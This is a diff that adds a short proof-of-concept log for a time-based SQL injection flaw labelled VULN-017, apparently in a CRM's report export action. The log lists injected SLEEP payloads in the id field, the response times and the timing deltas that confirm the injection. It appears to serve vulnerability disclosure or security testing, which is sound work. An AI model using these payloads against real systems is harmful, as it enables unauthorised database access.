@@ -1,0 +1,12 @@
+VULN-017 timing oracle (module=AOR_Reports action=export)
+============================================================
+case                        field payload                         elapsed(s)
+baseline (id)               id                                    0.05
+inject SLEEP(2)             id IS NULL OR (SELECT SLEEP(2)))#     4.22
+inject SLEEP(3)             id IS NULL OR (SELECT SLEEP(3)))#     6.20
+
+live row count of aok_knowledgebase at run time: 2 (SLEEP is evaluated once per row; deltas below scale accordingly)
+
+Deltas (attacker-controlled, proportional to injected N x row_count):
+  inject2 - baseline = 4.17s (expect ~4.0s)
+  inject3 - baseline = 6.15s (expect ~6.0s)
